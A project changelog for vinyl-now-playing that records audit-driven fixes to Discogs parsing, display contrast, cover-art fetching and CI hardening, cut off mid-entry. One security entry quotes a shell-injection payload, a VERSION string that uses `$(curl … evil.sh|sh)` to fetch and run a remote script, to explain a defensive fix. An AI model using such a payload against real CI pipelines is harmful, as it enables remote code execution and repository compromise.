# Changelog

All notable changes to vinyl-now-playing are documented here.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
Versions follow [Semantic Versioning](https://semver.org/): `MAJOR.MINOR.PATCH`.

---

## [Unreleased]

**Code-review hardening, round 3 (Wave 5 — metadata, tracklist & Discogs
reliability).** Wave 5 of the same audit (`CODE_REVIEW_2026-07-30.md`):
tightening how a track's position within its album is parsed and ranked, and
closing gaps in the Discogs read/write layer.

### Fixed

- **The side ordinal now follows the pressing's track *numbers*, not the order
  Discogs happens to list the rows in (META-8 #150 — LOW).** `side_position`
  was the 1-indexed *row* position of the track among its side-mates as they
  appear in the tracklist array. Discogs rows are community-edited and not
  guaranteed to be in sequence, so a release whose A-side is listed `[A2, A1]`
  rendered `A1` as **"02 OF 02"** — a position greater than its own track
  number, and the wrong number outright. `side_position` is now the rank of the
  track after sorting its side by the parsed track number, so `A1` reads
  **"01 OF 02"** regardless of row order and the `NN OF MM` caption stays
  coherent (N ≤ M) for out-of-sequence and gapped sides alike. `side_total`
  (the side's length) is unchanged.
- **Separated and space-padded vinyl positions now parse (META-9 #151 —
  LOW).** `_SIDE_RE` matched only the tight `A1` / `B12` / `AA3` forms, so the
  common Discogs variants `A-1`, `A.1`, `A 1` (and a stray-whitespace `A1 `)
  fell through to a bare raw-position display with no side letter, ordinal, or
  total — no `SIDE A · …` caption at all. The pattern now tolerates a single
  `-`/`.`/space separator and surrounding whitespace, and `track_display` is
  stripped so a padded row renders a clean caption. The side-letter run is
  bounded to one or two letters (`A`..`Z`, doubled `AA`/`BB`), so — crucially —
  word-label rows a release may carry (`Video 1`, `Bonus 2`, `Disc 1`) do **not**
  fabricate a `SIDE VIDEO` caption: like a bare letter `A` (no number) or a
  CD-style `1-01` (leading digit), they degrade gracefully to a raw-position
  display with no fabricated side. `is_last_track` — the sole gate on the
  Discogs Play Count write — is derived from the position+title `global_index`
  and never touched `_SIDE_RE`, so it is unaffected by the relaxed parsing.
  (The word-label bound was added in the adversarial cold-review pass, which
  caught that the whitespace tolerance alone would have newly matched
  `Video 1`.)

### Changed

- **Removed a redundant, provably-inert re-scan in `SideIndex.from_tracklist`
  (MUT-16 #136 — MEDIUM).** The factory recomputed the global-index anchor
  (`target_position`) with a second side-filtered loop over the tracklist, then
  fell back to the current entry's own position. Because the current entry is
  the first row matching the title and is by construction the first title match
  within its own side group, that loop *always* yielded exactly the fallback —
  a 120,000-case fuzz over relaxed-format and duplicate-position tracklists
  found 0 divergence. It is replaced by the single expression it always equalled
  (`target_position = current.position if current else None`). Behavior is
  identical, including the deliberately conservative reprise handling: a title
  repeated across sides resolves to its *first* occurrence, so a genuine closer
  that duplicates an earlier title stays `is_last_track = False` (a missed play
  count, never a phantom one). The `from_tracklist` docstring, which had
  credited a "side filter disambiguates" mechanism that no longer exists, is
  corrected to describe the actual first-occurrence logic. RED-first; adversarial
  cold review (no crash / no data-integrity defect; one introduced regression
  found and fixed, one degenerate nit declined).

The Discogs-reliability cluster (Unit 2):

### Fixed

- **A routine Discogs 429/5xx during a collection search is now classified
  transient instead of "unexpected bug" (META-6 #149 — LOW).** The reader's
  search/release/master calls go through the python3-discogs-client library,
  which raises its OWN `discogs_client.exceptions.HTTPError` for a non-2xx
  status — a type that does **not** inherit from
  `requests.exceptions.RequestException` (verified via its MRO). The
  transient/permanent taxonomy listed only the `requests` families, so a
  routine rate-limit or gateway error was mis-classified as non-transient and
  logged as "Unexpected error in Discogs collection search" — erasing exactly
  the routine-vs-defect distinction the taxonomy exists to provide for an
  operator reading the journal after an unattended overnight run. Added
  `discogs_client.exceptions.HTTPError` to `TRANSIENT_EXTERNAL_ERRORS` and
  corrected the module docstring's false "the Discogs client is requests-based"
  claim. RED-first (the new test was red before the tuple change); mutation-
  verified.

### Changed

- **The live Discogs smoke test moved out of the test namespace and got a
  public API seam (CRIT-6 #133 — MEDIUM).** `test_discogs_live.py` — a 226-line,
  `test_`-prefixed script at the repo root that hits the real Discogs API (and,
  with `--test-write`, increments a Play Count in the operator's live
  collection) — was only kept out of `pytest` by a `conftest.py` `collect_ignore`
  hack, one config edit away from a live-network write landing in CI. It is now
  `scripts/discogs_live_check.py` (outside `testpaths=tests`, no `test_` prefix,
  so `pytest` never collects it — verified with `--collect-only`), the
  `collect_ignore` workaround is deleted, and the six doc references were
  updated. It also reached into the writer's private `_get_collection_fields()`
  from outside the package, so a writer refactor would silently break the
  operator's first-boot smoke test; a public `DiscogsCollectionWriter.
  get_collection_fields()` facade was added and the script now calls that. (The
  other half of CRIT-6 — a real unit test for the field-ID map, closing MUT-1 —
  was already satisfied by prior-wave tests.)
- **The Discogs transport's identifying default headers are now pinned by a
  test (MUT-12 #135 — MEDIUM).** Only the `Authorization` header was implicitly
  exercised; `User-Agent`, `Content-Type` and their values survived string
  mutation. Discogs returns HTTP 403 to any request without an identifying
  `User-Agent` — a failure that only ever surfaces the first time the Pi touches
  the real API, which this project weights higher. A test now asserts the exact
  default header dict on `DiscogsHttp` construction, including a non-empty
  `User-Agent`; a refactor that drops or renames it turns the suite red
  (mutation-verified against empty, renamed, and removed UA).
- **Clarified that the scrobble timestamp shares the Last Played clock gate
  (CRIT-9 #148 — LOW).** The finding noted that META-5 cited only `writer.py`
  for "bogus scrobble timestamps," while the scrobble timestamp is actually
  captured in `track_commit_service.py`. The code already gates both
  date-dependent writes with `clock_is_trustworthy` (STAB-2) and both are
  tested; this adds an in-code cross-reference at the timestamp capture so a
  triager following the cite finds the scrobble path. (No behavioural change.)

### Fixed (nit)

- **Removed a stale hardcoded sample date from a `writer.py` comment (STAB-7
  #161 — NIT).** `# e.g. "2026-05-24"` beside `date.today()` became the generic
  `# ISO 8601, e.g. "YYYY-MM-DD"`.

## [1.5.5] — 2026-08-06

**Code-review hardening, round 3 (Wave 4 — display correctness & the contrast
guarantee).** Wave 4 of the same audit (`CODE_REVIEW_2026-07-30.md`): making the
"4.5:1 on all text" promise actually true on the panel nobody has switched on
yet.

### Fixed

- **The album title is now guaranteed readable — the accent it's drawn in is
  contrast-clamped, and every text role is clamped against the gradient it
  actually sits on, not flat bg (DISP-1 #125 + DISP-2 #126 — MEDIUM).** The
  album title, divider and genre-chip borders are all drawn in `accent`, but
  `accent` only passed through `clamp_luminance` — a perceived-brightness clamp
  that cannot brighten a pure-black or already-saturated color at all — while
  the real WCAG `ensure_contrast` was applied to `muted` alone. A matte-black
  sleeve gave `accent (0,0,0)` vs `bg (8,8,8)` = **1.05:1**; 34/62 covers
  measured below 4.5:1. Compounding it, *all* clamping was computed against flat
  `bg`, but text is blitted on a radial gradient whose brightest pixel is
  `lerp(bg, surface, 0.55)` ≈ `bg×1.33`, so even `muted` (clamped to 4.5:1 vs
  `bg`) measured **3.99:1** on the gradient. Now a single `text_background(bg,
  surface)` — the gradient's brightest pixel, via the new shared
  `GRADIENT_TEXT_PEAK` constant the gradient itself draws with — is the clamp
  target for both text roles, in `extract_palette` and in the per-frame
  re-clamp during the 1s lerp. `accent` is lifted to 4.5:1 by a new
  `ensure_contrast_hue_preserving` that raises HLS lightness while keeping the
  cover's hue (the smallest move that reaches the floor, so a red title stays
  red instead of washing pink) — chosen over blend-to-white for the artwork
  color; `muted` (a neutral grey) keeps blend-to-white. Scope covers the single
  `accent` role, so the divider and chips — also invisible on dark sleeves —
  become legible in the same move. Verified on the reproduced covers (black
  album, saturated blue/yellow, deep red) plus a low-contrast dark-blue; all
  clear 4.5:1 on the gradient after, none before. DESIGN.md and the CLAUDE.md
  "4.5:1 on all text" wording corrected to match (resolving the contradiction
  the finding named). RED-first; cold review SPEC / QUALITY PASS.
- **Cover images decode once instead of twice on first render (#173 — LOW,
  DISP-3 follow-up).** `validate_image_file` gained an opt-in `return_image`;
  `extract_palette` reuses the image the validator already decoded rather than
  re-opening and decoding the same file, halving the per-cover decode cost
  (once per unique album; the palette is memoized by URL). The validate-only
  download path is unchanged.
- **Non-Latin metadata no longer renders as reversed / mis-spaced glyphs
  (DISP-5 #129 — LOW).** `_render_tracked` drew every label one codepoint at a
  time with a manual advance to apply letter-spacing — which silently destroys
  text shaping for complex scripts (Arabic joining, Devanagari conjuncts,
  floating combining marks, emoji ZWJ clusters). It draws the meta footer
  (year · label · catalog) and the genre chips, both fed by stranger-editable
  Discogs free text, so a Japanese/Arabic/Cyrillic label name came out as
  unshaped, mis-spaced, possibly reversed glyphs. ASCII labels keep their exact
  designed tracking; any non-ASCII string is now rendered as a single shaped run
  (letting SDL_ttf shape it) with no manual tracking. RED-first; cold review
  SPEC / QUALITY PASS.
- **A run-on title or artist name no longer runs off the right edge of the
  screen (DISP-7 #131 — LOW).** `_wrap_lines` emitted any single token wider
  than the column as one un-broken line (and `_fit_wrapped` can't shrink a
  one-token line below the point it fits), while `_draw_wrapped_text` blitted
  with no horizontal clip — so a 120-character unbroken Discogs title was
  truncated by the display edge rather than the layout. Over-wide tokens are now
  character-broken into fitting chunks (consistent with the existing
  shrink-not-ellipsis product decision — the whole string still shows, wrapped),
  and the blit is clipped to the column width as a backstop for the residual
  single-glyph-wider-than-column case. `_wrap_lines` stays the single source of
  truth shared by drawing and measurement, so they can't disagree. Verified no
  character is lost, duplicated, or reordered, and the wrap terminates even on a
  degenerate zero/negative width. RED-first; cold review SPEC / QUALITY PASS.
- **The accent divider scales uniformly, and the docs stop over-claiming pure
  proportional scaling (DISP-6 #130 — LOW).** `layouts.py` scaled
  `divider_width` by the horizontal `sx` while every font uses the uniform `s =
  min(sx, sy)`, so on a wide/ultrawide panel the fixed-size "punctuation-mark"
  divider stretched far past its proportional size (215px at 3440×1440); it now
  tracks `s` like the fonts. Separately, `CLAUDE.md`/`DESIGN.md` claimed the
  renderer "scales every constant proportionally" with "no hard-coded
  breakpoints," but `layouts.py` has seven `max(floor, …)` font-size floors, so
  below ≈`s=0.33` fonts hold their minimum while rects keep shrinking. Decision
  (Lane, 2026-08-06): **keep the floors** as a legibility guard and correct the
  docs — they now state that scaling is proportional down to the floors, name
  1024×600 (`s=1.0`, floors inactive) as the supported reference, and stop
  claiming pure proportionality. No behavior change at the shipped resolution.
  The `sx`→`s` fix and the floors are pinned by new `test_layouts.py` cases.
- **A stalled SD read while loading cover art no longer freezes the whole event
  loop (STAB-5 #132 — LOW).** `_load_cover` ran `pygame.image.load` (an SD read),
  `.convert()` and `smoothscale` synchronously on the single asyncio loop, up to
  ~10×/s on a cache miss — so a worn card stalling a read for several seconds
  (normal wear-levelling / ECC-retry) blocked the audio-block drain, the
  silence ticker, and recognition along with it. The per-frame `_load_cover` is
  now non-blocking: it returns the cached scaled Surface or None (placeholder)
  and, on a cache miss, schedules an off-loop decode (`_decode_cover_async`,
  deduped by `(url, w, h)`). That task runs the SD read + decode
  (`pygame.image.load`) in the default executor — the actual stall — then does
  `.convert()` + `smoothscale` back on the loop (fast CPU on already-decoded
  bytes; `.convert()` needs the display's pixel format and SDL video ops belong
  on the main thread), caches the surface, and bumps `_cover_version` to
  repaint. The intricate STAB-1 machinery moved with it and its split got
  *cleaner*: corrupt/partial bytes fail in the off-loop `load()` → bounded
  unlink + refetch → blacklist; a display fault fails in the on-loop `.convert()`
  → log-once latch, never deleting the good file. RED-first (a spy proves the
  SD read now runs off the event-loop thread); the STAB-1 tests were moved to
  the async path and all failure classes stay mutation-pinned; full cold review
  SPEC / QUALITY PASS (dedup/leak/threading all reproduced clean).

### Security

- **`validate_image_file` no longer leaks a lowered `Image.MAX_IMAGE_PIXELS`
  process-global (#172 — LOW, test-hygiene).** It now saves and restores the
  Pillow global around the call, so a test that lowered the cap can't have that
  small value persist into a later test. (The restore is per-value-identity, not
  thread-isolated — concurrent validations on the shared executor may leave the
  global at the module cap — but every caller writes that identical safe
  *lowering*, so the residual is always the bound we want; strictly better than
  the old unconditional write.)

### Tests

- **The 4.5:1 guarantee is now mutation-proof (MUT-3 #127 — MEDIUM).** New
  assertions pin the contrast floor on the **output** of `extract_palette` over
  a battery of covers (including a deliberately low-contrast dark-blue), and
  that each clamp lifts a below-floor input above it while the hue-preserving
  lift keeps the hue. Mutating the 4.5 threshold, the clamp target (gradient →
  flat bg), the accent clamp itself, or the lift loop all now fail loudly — the
  suite previously only exercised covers that satisfied the guarantee for free.
  A new perf test proves the per-frame accent re-clamp keeps the palette-lerp
  cache-key count bounded (P-4 intact: 36 distinct palettes across a transition,
  flat as frame count rises).
- **The real `DisplayRenderer` is now constructed and exercised in tests, not
  just `__new__`'d around (TQ-1 #128 — MEDIUM).** Every renderer test built its
  subject with `DisplayRenderer.__new__(...)` and hand-assigned attributes, so
  `__init__`, `start()`, `_on_state_change` and the `_render()` status dispatch
  were **0% executed** — an `__init__` refactor that dropped
  `self.state.on_change(self._on_state_change)` would ship green while the Pi
  showed the boot card and then froze forever. New `test_renderer_lifecycle.py`
  builds the real object under `SDL_VIDEODRIVER=dummy`: it asserts (behaviorally,
  through a real `set_status` → Signal → handler) that construction wires the
  state subscription; table-drives `_render()` across every `PlayerStatus`
  (IDLE / LISTENING / ERROR / PLAYING-with-track / PLAYING-without-track →
  boot); and smoke-tests `start()` creating a headless surface. Proven by
  mutation: dropping the subscription, or misrouting a dispatch arm, fails the
  new tests while the entire prior renderer suite (59 tests) stays green — the
  exact blind spot the finding named. Test-only; no production change.

## [1.5.4] — 2026-08-06

**Code-review hardening, round 3 (Wave 3 — untrusted input & credential
hardening).** Wave 3 of the same audit (`CODE_REVIEW_2026-07-30.md`): the gaps
around untrusted-input handling and credential safety, plus the guard paths the
suite never executed — the checks that stand between a stranger-editable Discogs
field and the appliance.

### Fixed

- **A truncated or corrupt cover download is now rejected instead of cached and
  displayed forever (DISP-3 / SEC-6, #110 — MEDIUM).** `validate_image_file` is
  the only gate between the network and the on-disk cover cache
  (`cover_cache.download()`), and the download loop never reconciles bytes
  against `Content-Length`. Its docstring claimed Pillow's `verify()` rejects
  truncated files — but `verify()` does no structural check for JPEG (the format
  the cache is named for: `path_for` returns `<md5>.jpg`); only
  `PngImageFile.verify()` actually validates. So a cover whose download was cut
  off mid-scan by a dropped connection passed validation, was `os.replace`'d into
  the cache, and — since `exists()` never re-validates — was shown for every
  future play of that album, with `extract_palette` deriving the whole five-colour
  scheme from the garbage half. Both failures were silent. The validator now
  reads the header and applies the format + pixel-count gates first (so a
  decompression bomb is still rejected before any decode), then forces a real
  `Image.open(path).load()` — the only structural check that bites for JPEG —
  with `LOAD_TRUNCATED_IMAGES` left False so a short read raises. Verified against
  truncated JPEG/PNG/WEBP/GIF/BMP (and a corrupt-mid-scan JPEG); the caller
  already unlinks the rejected `.part` file and retries within a bounded limit.
  RED-first (the truncated JPEG reproduced passing validation on the old code);
  the `load()` gate is mutation-pinned (delete-`load` and `load`→`verify` both
  killed); cold review SPEC / QUALITY PASS. The misleading docstring/comment were
  corrected to describe what `verify()` actually does per format.
- **A malformed MusicBrainz release no longer discards cover art from a later
  release, and `get_cover_art_url` gained its first test file (TQ-3, #115 —
  MEDIUM).** `src/metadata/coverart.py` parses untrusted MusicBrainz payloads
  into a URL the fetcher then dials, but had **no tests at all** and a latent
  bug: when MusicBrainz returned a release's images as a list of strings (not
  dicts), `img.get('front')` raised `AttributeError`, which escaped the inner
  `except ResponseError` and aborted the *whole* candidate loop — so a later
  release that had valid art was never tried (a `ResponseError` on the same
  release would have skipped to it correctly). The per-release body is now
  fully guarded: a non-dict image, a non-dict payload, a non-iterable image
  list, or a release without an `id` skips that release and tries the next,
  and the return value is guaranteed to be a `str` (or `None`) so a mistyped
  payload can't hand a non-string to the fetcher. URL scheme/host validation is
  deliberately left to the SSRF-hardened fetcher (`cover_cache`), not
  duplicated. New `tests/test_coverart.py` (musicbrainzngs patched) covers the
  happy path, empty/missing lists, `ResponseError`-then-success, four malformed
  payloads (incl. non-dict images and a `file://` URL), and the return-type
  contract. RED-first (the four negative cases fail on the old code); the fix is
  mutation-pinned in every element; cold review SPEC / QUALITY PASS.
- **The Discogs transport no longer silently turns a non-GET/POST verb into a
  POST (LB-2, #117 — LOW).** `request()` dispatched `session.get if method ==
  "GET" else session.post`, so `request("DELETE", …)` / `("PUT", …)` silently
  issued POSTs, and a lowercase `request("get", …)` failed the `== "GET"` test
  twice — it POSTed *and* lost its 429 retry. Latent today (only GET/POST are
  used), but a silent-wrong-verb footgun on the one transport that WRITES to the
  real collection. `request()` now upper-cases the method, dispatches GET/POST
  explicitly, and raises `ValueError` on any other verb. (Kept the
  `session.get`/`session.post` seam the docstring documents for test mocking
  rather than the finding's `session.request` suggestion; all six in-tree callers
  pass uppercase `"GET"`/`"POST"` literals, so nothing breaks.) RED-first;
  mutation-pinned; cold review SPEC / QUALITY PASS.
- **The per-hop cover-art connection pool is closed instead of leaked (STAB-3,
  #123 — LOW).** `_open_cover_stream` built a fresh `urllib3.HTTPSConnectionPool`
  per redirect hop as a local and never closed it; `download()`'s `finally` only
  released the connection back to a pool nobody would reuse. No fd leak was
  measured, but every cover paid a full TCP+TLS handshake and pool objects
  churned. The pool is now context-managed (`with … as pool:`) and closed as
  soon as the streaming response is checked out — the response keeps its own
  connection and streams fine after close (verified end-to-end against a real
  localhost server: 300 KB streamed post-close, and `release_conn()` is safe
  against the closed pool). RED-first (a `closed` assertion fails on the old
  code); cold review SPEC / QUALITY PASS. The finding's optional keyed-pool cache
  (connection reuse) was deliberately deferred.

### Security

- **A wrong-typed credential in `config.yaml` no longer leaks into the logged
  startup error (SEC-3, #114 — MEDIUM).** The aggregated `ConfigError` from
  `config.py` interpolated every wrong-typed field's raw value with `!r` —
  including `discogs.user_token` and the Last.fm `api_key` / `api_secret` /
  `session_key` — and `main.py` logs that error in full to the systemd journal.
  So a credential YAML doesn't read as a string (an all-digit token read as int,
  a `1e5`-shaped value, `yes`/`no`, a mis-pasted list) failed startup loudly
  *and* wrote the secret verbatim to a log that persists across reboots. The
  type-mismatch message now emits `<redacted>` for a known set of secret fields
  while still reporting the path and observed type; non-secret fields keep their
  value (the operator needs `got 44100.0` to fix a config). RED-first (the four
  credentials reproduced leaking on the old code); the redaction is
  mutation-pinned in all four directions; cold review SPEC / QUALITY PASS across
  int/float/bool/list/dict secret shapes and the aggregated / non-mapping error
  paths.
- **Capped `urllib3 <3` and added a real-pool guard so a breaking upgrade can't
  silently drop the S-7 IP pin (TQ-4, #116 — MEDIUM).** The cover fetcher's
  SSRF pin (`cover_cache._open_cover_stream`) relies on urllib3 forwarding the
  `server_hostname` (TLS SNI) and `assert_hostname` (cert hostname) kwargs to
  the connection, but `requirements.txt` pinned `urllib3>=2.0.0` floor-only and
  the existing test *mocks* the pool — so a future `pip install` resolving a
  urllib3 that removed those kwargs would only surface on the Pi. Pinned
  `urllib3>=2.0.0,<3.0.0` (that major is the one dep with a documented
  API-contract risk; other floors left as-is) and added a test that builds a
  **genuine** `HTTPSConnectionPool` + connection (no socket) and asserts both
  kwargs actually reach the connection, so a breaking urllib3 fails in CI
  instead. Non-vacuity shown (dropping a kwarg reddens the test); cold review
  SPEC / QUALITY PASS. The hashed lockfile and broader version ceilings the
  finding also suggested were deliberately deferred (a hashed lock is
  platform/Python-specific and best generated on the Pi).
- **`_redact_url` no longer leaks the raw URL (query string included) on an
  empty-path URL (SEC-2, #120 — LOW).** The `return "/".join(segments) or url`
  fallback returned the original URL verbatim whenever `parts.path` was empty,
  because `"/".join([""])` is falsy — exactly defeating the redaction's promise
  to drop the query string (where a future query-string credential would land in
  the 429 log). Latent today (the token rides in a header), but the log path is
  the whole point of the function. It now returns the masked path or a bare `/`,
  never the raw URL. Verified across 12 adversarial URLs (origin-only, userinfo,
  protocol-relative, `?`-only, root path) — no query/credential/host leaks; the
  username-masking + query-drop still hold on a normal path. RED-first;
  mutation-pinned; cold review SPEC / QUALITY PASS.
- **The SSRF IP classifier decodes and re-checks the IPv4 embedded in NAT64 /
  6to4 addresses, independent of the Python version (SEC-5, #122 — LOW).** A
  NAT64 (`64:ff9b::/96`) or 6to4 (`2002::/16`) address can wrap an internal IPv4
  (e.g. `169.254.169.254`). Modern CPython (≥3.11.9 / ≥3.9.19, via gh-113171)
  already flags these prefixes as `is_reserved` / `is_private`, so the existing
  battery rejects them on the app's runtime (Python 3.11) — the finding's
  "classifies as global and would be pinned" premise was measured false there,
  so this was not a live hole. But a security boundary should not depend on the
  stdlib's version-specific handling of exotic ranges, so the classifier now also
  decodes the embedded IPv4 (`_embedded_ipv4`) and re-runs the same battery
  (`_is_disallowed_ip`, extracted verbatim from the inline checks) on it —
  rejecting an internal wrap on ANY Python. The decoder is pinned directly (on
  ≥3.11.9 the generic battery short-circuits the embedded check, so it is
  belt-and-suspenders there). Cold review SPEC / QUALITY PASS; no encoding
  (IPv4-mapped v6, NAT64, 6to4, mixed answer sets) pins an internal IP.
- **A slow-drip cover response can no longer park a shared executor worker
  forever; the whole fetch now has a wall-clock deadline, and an oversized
  declared body is rejected up front (SEC-4, #121 — LOW).** `cover_cache.download()`
  ran on the default executor that Discogs requests and Last.fm scrobbles also
  share, and its `urllib3.Timeout(read=15)` bounds each *socket read*, not the
  transfer — so an allow-listed but flaky/hostile host emitting one byte per
  <15s keeps every read inside the timeout while the download runs effectively
  forever, starving that pool. The fix adds a monotonic `_DOWNLOAD_DEADLINE_SECONDS`
  (45s) budget spanning the whole call — checked before each redirect hop and
  before each body read — plus an early reject when a response *declares* a
  `Content-Length` over the 10 MB cap. Critically, the body is now read with
  `resp.read1(64*1024)` rather than `resp.stream(64*1024)`: `stream` delegates to
  a buffered read that blocks until a full 64 KB chunk accumulates, so under a
  drip a single read never returns and the deadline check never gets a turn —
  the first cut of this fix (and its mock-`stream` test) hid exactly that live
  hang, caught by adversarial review and reproduced against real urllib3. `read1`
  returns after one underlying socket read, so control returns to the deadline
  check after each recv and the drip is bounded. RED-first; a **real-socket**
  integration test drips bytes through live urllib3 and proves `download()`
  aborts at the deadline (and fails fast, not hangs, if the code ever regresses
  to a buffering read); all five guards mutation-pinned (both deadline checks,
  the declared-size `>`-vs-`>=` boundary and its flip, the garbage-header
  try/except). Cold review then narrow second-pass: SPEC / QUALITY PASS. A
  distinct, pre-existing header-drip vector the review surfaced (a hop dripping
  response *headers* inside `urlopen`, which the between-hop deadline can't
  interrupt) is filed as follow-up #176, not folded into this fix.
- **The version-badge CI workflow no longer lets `VERSION` file content inject
  shell in a `contents: write` job, and pins its action to a commit SHA (TQ-5,
  #124 — LOW).** `sync-version-badge.yml` read the pushed version with
  `cat VERSION` and textually interpolated `${{ steps.ver.outputs.version }}`
  into three `run:` shells (a warn `echo`, the `sed` badge rewrite, and the
  commit message) — so a `VERSION` of `1.5.2$(curl$IFS-sfL$IFSevil.sh|sh)` would
  execute arbitrary commands in a job whose `GITHUB_TOKEN` can push to `main`
  (the `tr -d '[:space:]'` there blocks spaces but not `$IFS`, `$()`, or
  backticks). `sed`'s `|` delimiter also meant a `|`/`&`/`\` in the version
  corrupted the replacement, and `actions/checkout` floated on the mutable tag
  `@v4`. Now the version is validated against a strict semver pattern
  (`^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$`, which keeps `1.4.0-rc1`-style
  pre-release tags working while admitting no shell/sed metacharacter) and the
  build fails loudly before use if it doesn't match; the value is then handed to
  every shell via step-level `env:` and referenced as `"$VERSION"` — inert data,
  never spliced into script text; and `actions/checkout` is pinned to the full
  commit SHA `11bd719…af683` (v4.2.2, API-verified). Defense is layered:
  validation rejects a payload up front, and env-passing keeps it inert even if
  validation were bypassed. Verified by executing each step's shell — the old
  interpolation runs an injected `$()` (RED), the env form does not, malformed
  and empty versions are rejected, and the badge still rewrites correctly for
  `1.5.4` and `1.4.0-rc1`; shellcheck-clean, YAML-valid; cold review SPEC /
  QUALITY PASS. (Credit retained from the finding: `permissions:` was already
  explicitly job-scoped, not default write-all.)

### Tests

- **Pinned both rejection paths of `validate_image_file` — the cover-art format
  allow-list and the decompression-bomb dimension bound (MUT-2, #109 — HIGH).**
  `cover_cache.download()` calls this as the last check before a stranger-editable
  Discogs image URI is written into the on-disk cache, yet both `raise` branches
  had zero test executions. The only "oversized" test fed a 40× image, which
  trips Pillow's *own* 2× `DecompressionBombError` and is caught by the generic
  `except` — so the explicit `width * height > MAX_IMAGE_PIXELS` guard (the sole
  defense in the 1×–2× "bomb" band Pillow only *warns* about) and the format
  allow-list could each be deleted with the suite still green. Added three tests:
  a valid JPEG accepted; a valid-but-disallowed format (TIFF) rejected by the
  allow-list; and an image in the 1×–2× band rejected by the explicit dimension
  guard — each message-matched so it pins its own branch rather than Pillow's
  backstop. The four previously-surviving guard mutants ('condition → False' and
  'delete raise' on each guard) are now killed, along with a JPEG-allow-list
  mutant; the existing >2× "oversized" test gained a comment clarifying it
  exercises Pillow's backstop, not the explicit guard. Cold review SPEC / QUALITY
  PASS. Test-only; no production behavior change.
- **Pinned the cover-cache's *default* disk bounds — the `max_files` / `max_bytes`
  the real appliance actually runs with (MUT-6, #111 — MEDIUM).** Every existing
  test constructs `CoverArtCache` with explicit bounds, so the module defaults
  (`_DEFAULT_MAX_CACHE_FILES = 500`, `_DEFAULT_MAX_CACHE_BYTES = 256 * 1024 * 1024`)
  and their arithmetic were asserted nowhere — ten mutants survived, including
  either single `*` → `/` on the byte constant (both collapse 256 MB to 256
  *bytes*). A units slip would ship green and, on the Pi, prune the entire cover
  cache to zero every boot: every album re-downloads, meaning SD-card write
  amplification and a coverless display when offline. Added two tests: one asserts
  `CoverArtCache(dir)` built with no bounds has `max_files == 500` and
  `max_bytes == 256 * 1024 * 1024`; one seeds 501 covers and confirms `_prune()`
  returns to exactly 500 via the default file-count bound. Both `*` → `/`
  survivors and the count-value mutants (each verified a genuine survivor of the
  pre-change suite) are now killed. Cold review SPEC / QUALITY PASS. Test-only; no
  production behavior change.
- **Pinned the cover-cache eviction loop across *many* evictions (MUT-7, #112 —
  MEDIUM).** No test anywhere ran `_prune()`'s eviction while-loop body more than
  once, so two mutants survived: `i += 1` → `i += 0` (which, on a second
  iteration, re-picks the already-unlinked victim, `unlink` raises `OSError`, the
  `continue` skips the decrement, and it **spins forever** — an infinite loop
  inside `CoverArtCache.__init__`, so the appliance never finishes booting) and
  `file_count -= 1` → `-= 2` (a silent under-evict that lets the cache grow past
  its bound and fill the SD card). Added three tests: seed 10 covers with distinct
  mtimes and prune to `max_files=3`, asserting the 3 newest survive by name (a
  7-file eviction); the same driven by the byte bound; and a case where a victim's
  `unlink` raises `OSError`, asserting `_prune()` skips it and terminates. Both
  mutants — verified genuine survivors of the pre-change suite — are now killed
  (`i += 0` by non-termination, `-= 2` by the post-eviction count). Cold review
  SPEC / QUALITY PASS. Test-only; no production behavior change.
- **Pinned the *whole* streaming-kwarg contract of the cover fetch, not just
  `redirect` (MUT-8, #113 — MEDIUM).** `_open_cover_stream` passes four booleans
  to `pool.urlopen` — `redirect=False`, `retries=False`, `preload_content=False`,
  `decode_content=False` — but the test asserted only `redirect`, leaving the
  other three mutable with the suite green. The load-bearing one is
  `preload_content`: flipped to `True`, urllib3 reads the *entire* response body
  into RAM before `download()` can apply its `_MAX_COVER_BYTES` chunk cap, so a
  few-hundred-MB (attacker-influenced or merely broken) cover URL becomes a RAM
  exhaustion on a 2 GB Pi even though the on-disk file stays bounded;
  `decode_content=True` would likewise let a gzip-inflated body dodge the
  pre-inflation byte count. The `_open_cover_stream` test now asserts all four
  kwargs. `retries`, `preload_content`, and `decode_content` were each verified
  genuine survivors of the pre-change suite and are now killed (kwarg *deletion*
  is caught too, since urllib3 defaults `preload_content` to `True`). Cold review
  SPEC / QUALITY PASS. Test-only; no production behavior change.
- **Individually pinned each `download()` failure guard, so a dropped check
  can't hide behind a later one (MUT-10, #118 — LOW).** The five guards
  (redirect cap, no-response, HTTP-status `>= 400`, Content-Type allow-list,
  byte cap) were interchangeable in the suite: every failure still terminated in
  *some* downstream exception, so deleting the Content-Type check stayed green
  because a non-image body later failed image validation — while a valid image
  served as `text/html`, or a 400 carrying an image body, would flow into the
  cache. Each guard's test now uses `pytest.raises(match=...)` to pin its own
  branch, plus a new `status == 400` boundary case (valid PNG body, so bypassing
  the `>=` guard would otherwise succeed) and a redirect-overflow case. All
  reachable guard mutants are killed (`>=`→`>`, check-disable, and — verified via
  a message-only mutation — the `match=` strings pin the intended branch). The
  `if resp is None` guard is unreachable through the public `download()` (the
  loop only `break`s with a response set, and exhaustion raises "too many
  redirects" first), so it is a documented equivalent mutant, not black-box
  testable. Test-only; no production behavior change.
- **Pinned every numeric limit in the fetch and rate-limit paths to its shipped
  value (MUT-9, #119 — LOW).** `_MAX_COVER_BYTES`, `_MAX_COVER_REDIRECTS` (5),
  `_COVER_CONNECT_READ_TIMEOUT` (15), and transport's `_HTTP_TIMEOUT` (15),
  `_RATE_LIMIT_MAX_WAIT` (10), `_RATE_LIMIT_DEFAULT_WAIT` (2) were all mutable
  with the suite green — tests proved a cap *existed*, never *which*, so a
  redirect cap raised to 500 or a units slip would ship silently. Added a
  constants assertion per module, a redirect chain driven to exactly
  `_MAX_COVER_REDIRECTS + 1` hops (into the "too many redirects" raise), and a
  `Retry-After: 0` case asserting the retry still sleeps `1` — pinning the
  `wait = max(1, retry_after)` floor against the `max(0, …)` mutant that would
  fire an instant retry at an API that just throttled the device. All named
  mutants killed. Test-only; no production behavior change.

## [1.5.3] — 2026-08-04

**Code-review hardening, round 3 (Wave 2 — keep the appliance alive).** Wave 2 of
the same audit (`CODE_REVIEW_2026-07-30.md`): the liveness and crash-loop findings
that decide whether the unattended appliance recovers on its own — through a device
glitch, a bad config edit, or network trouble — or needs a power cycle. Not the
irreversible-data issues (that was Wave 1), but the ones that keep it running.

### Fixed

- **A stalled capture stream is now detected and rebuilt instead of hanging
  forever (CONC-5, #91 — HIGH).** Audio blocks reach the capture loop only via the
